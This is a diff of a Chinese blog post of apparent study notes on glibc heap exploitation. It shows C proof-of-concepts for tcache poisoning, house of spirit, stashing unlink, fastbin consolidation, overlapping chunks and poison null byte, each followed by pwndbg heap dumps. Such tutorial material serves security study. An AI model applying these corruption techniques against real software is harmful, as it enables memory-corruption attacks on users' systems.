@@ -2474,7 +2474,687 @@ int main()
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>伪造堆需要绕过：<code>FD-&gt;bk = BK; BK-&gt;fd = FD;</code></p>
-<p>伪造完成后改地址相邻的下一个堆的的<code>prve_size</code>为伪造的堆大小、<code>inuse</code>位为<code>0</code></p>
+<p>伪造完成后改地址相邻的下一个堆的的<code>prve_size</code>为伪造的堆大小、<code>inuse</code>位为<code>0</code>再释放掉它即可向后合并取消连接<code>fake chunk</code></p>
+<p>先创建两个堆</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x431
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405680
+Size: 0x431
+
+Top chunk | PREV_INUSE
+Addr: 0x405ab0
+Size: 0x20551<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在第一个堆伪造一个堆的<code>fd、bk</code>并把第二个堆<code>inuse</code>位和<code>prve_size</code>位改掉</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x431
+
+Allocated chunk
+Addr: 0x405680
+Size: 0x430
+
+Top chunk | PREV_INUSE
+Addr: 0x405ab0
+Size: 0x20551
+
+pwndbg&gt; x&#x2F;20gx 0x405250
+0x405250:	0x0000000000000000	0x0000000000000431
+0x405260:	0x0000000000000000	0x0000000000000000
+0x405270:	0x0000000000404050	0x0000000000404058
+0x405280:	0x0000000000000000	0x0000000000000000
+0x405290:	0x0000000000000000	0x0000000000000000
+0x4052a0:	0x0000000000000000	0x0000000000000000
+0x4052b0:	0x0000000000000000	0x0000000000000000
+0x4052c0:	0x0000000000000000	0x0000000000000000
+0x4052d0:	0x0000000000000000	0x0000000000000000
+0x4052e0:	0x0000000000000000	0x0000000000000000
+pwndbg&gt; x&#x2F;20gx 0x405680
+0x405680:	0x0000000000000420	0x0000000000000430
+0x405690:	0x0000000000000000	0x0000000000000000
+0x4056a0:	0x0000000000000000	0x0000000000000000
+0x4056b0:	0x0000000000000000	0x0000000000000000
+0x4056c0:	0x0000000000000000	0x0000000000000000
+0x4056d0:	0x0000000000000000	0x0000000000000000
+0x4056e0:	0x0000000000000000	0x0000000000000000
+0x4056f0:	0x0000000000000000	0x0000000000000000
+0x405700:	0x0000000000000000	0x0000000000000000
+0x405710:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>释放第二个堆即可通过第一个堆去改任意地址的内容</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x431
+
+Allocated chunk
+Addr: 0x405680
+Size: 0x430
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405ab0
+Size: 0x20551
+
+pwndbg&gt; x&#x2F;20gx 0x405250
+0x405250:	0x0000000000000000	0x0000000000000431
+0x405260:	0x0000000000000000	0x0000000000020da1
+0x405270:	0x0000000000404050	0x0000000000404058
+0x405280:	0x0000000000000000	0x0000000000000000
+0x405290:	0x0000000000000000	0x0000000000000000
+0x4052a0:	0x0000000000000000	0x0000000000000000
+0x4052b0:	0x0000000000000000	0x0000000000000000
+0x4052c0:	0x0000000000000000	0x0000000000000000
+0x4052d0:	0x0000000000000000	0x0000000000000000
+0x4052e0:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache_poisoning"></a>tcache_poisoning</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;assert.h&gt;
+
+int main()
+&#123;
+	setbuf(stdin, NULL);
+	setbuf(stdout, NULL);
+
+	size_t stack_var;
+	intptr_t *a &#x3D; malloc(128);
+	intptr_t *b &#x3D; malloc(128);
+    
+	free(a);
+	free(b);
+
+	b[0] &#x3D; (intptr_t)&amp;stack_var;
+	intptr_t *c &#x3D; malloc(128);
+
+	assert((long)&amp;stack_var &#x3D;&#x3D; (long)c);
+	return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>打<code>fd</code>实现任意地址读写</p>
+<p>创建两个堆再释放掉，进入<code>tcache</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x405250
+Size: 0x91
+fd: 0x00
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x4052e0
+Size: 0x91
+fd: 0x405260
+
+Top chunk | PREV_INUSE
+Addr: 0x405370
+Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>改第二个堆的<code>fd</code>为目标地址之后再申请即可实现任意地址读写</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x91
+
+Free chunk (tcache) | PREV_INUSE
+Addr: 0x4052e0
+Size: 0x91
+fd: 0x7fffffffdd70
+
+Top chunk | PREV_INUSE
+Addr: 0x405370
+Size: 0x20c91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;assert.h&gt;
+
+int main()
+&#123;
+	setbuf(stdout, NULL);
+
+	malloc(1);
+
+	unsigned long long *a; 
+	unsigned long long fake_chunks[10]; 
+    
+	fake_chunks[1] &#x3D; 0x40; 
+	a &#x3D; &amp;fake_chunks[2];
+
+	free(a);
+
+	void *b &#x3D; malloc(0x30);
+
+	assert((long)b &#x3D;&#x3D; (long)&amp;fake_chunks[2]);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在栈上伪造一个堆之后释放掉再申请即可申请到伪造的堆，<code>tcache</code>会判断取出堆之后的下标不能为负数，所以要先创建一个堆</p>
+<p>先随便创建一个堆</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x21
+
+Top chunk | PREV_INUSE
+Addr: 0x405270
+Size: 0x20d91<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>再在栈上伪造一个堆，主要是伪造<code>size</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd20
+0x7fffffffdd20:	0x000000000000000f	0x0000000000000040
+0x7fffffffdd30:	0x00007fffffffdd98	0x00000000000000f0
+0x7fffffffdd40:	0x00000000000000c2	0x00000000004013ad
+0x7fffffffdd50:	0x00007ffff7de59a0	0x0000000000000000
+0x7fffffffdd60:	0x0000000000401360	0x00000000004010f0
+0x7fffffffdd70:	0x00007fffffffde60	0x00007fffffffdd30
+0x7fffffffdd80:	0x0000000000401360	0x00007ffff7a05b97
+0x7fffffffdd90:	0x0000000000000001	0x00007fffffffde68
+0x7fffffffdda0:	0x000000010000c000	0x00000000004011d6
+0x7fffffffddb0:	0x0000000000000000	0x762a1758ffbc0fb4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>释放之后再申请即可申请到这个位置实现任意地址读写</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0x40 [  1]: 0x7fffffffdd30 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache_stashing_unlink_attack"></a>tcache_stashing_unlink_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;assert.h&gt;
+
+int main()&#123;
+    unsigned long stack_var[0x10] &#x3D; &#123;0&#125;;
+    unsigned long *chunk_lis[0x10] &#x3D; &#123;0&#125;;
+    unsigned long *target;
+
+    setbuf(stdout, NULL);
+
+    stack_var[3] &#x3D; (unsigned long)(&amp;stack_var[2]);
+
+    for(int i &#x3D; 0;i &lt; 9;i++)&#123;
+        chunk_lis[i] &#x3D; (unsigned long*)malloc(0x90);
+    &#125;
+
+    for(int i &#x3D; 3;i &lt; 9;i++)&#123;
+        free(chunk_lis[i]);
+    &#125;
+
+    free(chunk_lis[1]);
+    free(chunk_lis[0]);
+    free(chunk_lis[2]);
+    
+    malloc(0xa0);
+    malloc(0x90);
+    malloc(0x90);
+
+    chunk_lis[2][1] &#x3D; (unsigned long)stack_var;
+    calloc(1,0x90);
+
+    target &#x3D; malloc(0x90);   
+
+    assert(target &#x3D;&#x3D; &amp;stack_var[2]);
+    return 0;
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>该方法是<code>2.27</code>或<code>2.29</code>下用<code>calloc</code>创建堆时候针对<code>small bin</code>的攻击</p>
+<p>创建<code>9</code>个大小属于<code>unsorted bin</code>的堆并全部释放</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405390
+smallbins
+empty
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建一个比释放的堆大的堆使得释放的堆进入<code>small bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0xa0 [  7]: 0x405300 —▸ 0x405760 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着从<code>tcache</code>取了两个堆</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+0xa0: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>将<code>small bin</code>的最后一个堆<code>fd</code>改成栈上的地址，即目标地址</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0xa0 [  5]: 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+0xa0 [corrupted]
+FD: 0x405390 —▸ 0x405250 —▸ 0x7ffff7dcfd30 (main_arena+240) ◂— 0x405390
+BK: 0x405250 —▸ 0x405390 —▸ 0x7fffffffdcd0 —▸ 0x7fffffffdce0 ◂— 0x0
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>由于<code>calloc</code>不会从<code>tcache</code>中取堆，所以用<code>calloc</code>创建一个堆，<code>tcache</code>中有两个空位，此时<code>small bin</code>中的堆会进入<code>tcache</code>，再次用<code>malloc</code>申请即可得到篡改的栈地址</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0xa0 [  7]: 0x7fffffffdce0 —▸ 0x4053a0 —▸ 0x4056c0 —▸ 0x405620 —▸ 0x405580 —▸ 0x4054e0 —▸ 0x405440 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+0xa0 [corrupted]
+FD: 0x405390 —▸ 0x4056c0 ◂— 0x0
+BK: 0x7fffffffdce0 ◂— 0x0
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="fastbin-dup-consolidate-double-free"><a href="#fastbin-dup-consolidate-double-free" class="headerlink" title="fastbin_dup_consolidate(double free)"></a>fastbin_dup_consolidate(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;assert.h&gt;
+
+void main() &#123;
+	void *ptr[7];
+
+	for(int i &#x3D; 0; i &lt; 7; i++)
+		ptr[i] &#x3D; malloc(0x40);
+	for(int i &#x3D; 0; i &lt; 7; i++)
+		free(ptr[i]);
+
+	void* p1 &#x3D; calloc(1,0x40);
+  	free(p1);
+
+  	void* p3 &#x3D; malloc(0x400);
+	assert(p1 &#x3D;&#x3D; p3);
+
+	free(p1);
+	void *p4 &#x3D; malloc(0x400);
+	assert(p4 &#x3D;&#x3D; p3);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用了<code>double free</code>和<code>calloc</code>不会从<code>tcache</code>取堆的原理</p>
+<p>填满<code>tcache</code>再释放一个堆到<code>fast bin</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x405890 ◂— 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>创建一个属于<code>small bin</code>的堆然后再次释放<code>fast bin</code>里的堆，此时<code>fast bin</code>中的堆被和那个大于<code>small bin</code>的堆合并了</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
+tcachebins
+0x50 [  7]: 0x405850 —▸ 0x405800 —▸ 0x4057b0 —▸ 0x405760 —▸ 0x405710 —▸ 0x4056c0 —▸ 0x405670 ◂— 0x0
+0x410 [  1]: 0x4058a0 ◂— 0x0
+fastbins
+0x20: 0x0
+0x30: 0x0
+0x40: 0x0
+0x50: 0x0
+0x60: 0x0
+0x70: 0x0
+0x80: 0x0
+unsortedbin
+all: 0x0
+smallbins
+empty
+largebins
+empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>申请出合并的堆即可申请到那个大的堆了且它并没有被释放</p>
+<h3 id="overlapping-chunks-off-by-one"><a href="#overlapping-chunks-off-by-one" class="headerlink" title="overlapping_chunks(off-by-one)"></a>overlapping_chunks(off-by-one)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;assert.h&gt;
+
+int main(int argc , char* argv[])
+&#123;
+	setbuf(stdout, NULL);
+
+	intptr_t *p1,*p2,*p3,*p4;
+    
+	p1 &#x3D; malloc(0x500 - 8);
+	p2 &#x3D; malloc(0x500 - 8);
+	p3 &#x3D; malloc(0x80 - 8);
+
+	memset(p1, &#39;1&#39;, 0x500 - 8);
+	memset(p2, &#39;2&#39;, 0x500 - 8);
+	memset(p3, &#39;3&#39;, 0x80 - 8);
+
+	free(p2);
+
+	int evil_chunk_size &#x3D; 0x581;
+	int evil_region_size &#x3D; 0x580 - 8;
+    
+	*(p2-1) &#x3D; evil_chunk_size; 
+    
+	p4 &#x3D; malloc(evil_region_size);
+
+	memset(p4, &#39;4&#39;, evil_region_size);
+	memset(p3, &#39;3&#39;, 80);
+
+	assert(strstr((char *)p4, (char *)p3));
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>申请三个堆（前两个堆大于<code>tcache</code>)，利用第一个堆去修改第二个堆的内容，释放第二个堆进入<code>unsorted bin</code>之后改第二个堆的<code>size</code>为第二个堆和第三个堆的大小之和，再去创建这个大小的堆即可利用这个堆去覆写第三个堆而第三个堆仍然存在</p>
+<p>先创建三个堆，并释放第二个堆</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x501
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x405750
+Size: 0x501
+fd: 0x7ffff7dcfca0
+bk: 0x7ffff7dcfca0
+
+Allocated chunk
+Addr: 0x405c50
+Size: 0x80
+
+Top chunk | PREV_INUSE
+Addr: 0x405cd0
+Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>改第二个堆的<code>size</code>位使其覆盖下一个堆，此时已经看到第二个堆包含了第三个堆，再去创建出这个堆即可实现对第三个对的<code>overlap</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x501
+
+Free chunk (unsortedbin) | PREV_INUSE
+Addr: 0x405750
+Size: 0x581
+fd: 0x7ffff7dcfca0
+bk: 0x7ffff7dcfca0
+
+Top chunk | PREV_INUSE
+Addr: 0x405cd0
+Size: 0x20331<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="poison-null-byte-off-by-null"><a href="#poison-null-byte-off-by-null" class="headerlink" title="poison_null_byte(off-by-null)"></a>poison_null_byte(off-by-null)</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>
+
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span>
+	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span>
+	<span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span>
+	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span>
+	<span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span>
+	<span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span>
+	<span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span>
+
+	a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+	b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xa00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+    <span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x9f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xa00</span><span class="token punctuation">;</span>
+	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+
+	<span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>
+	b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x480</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同<code>2.23</code>,只要堆大小在<code>tcache</code>之上即可</p>
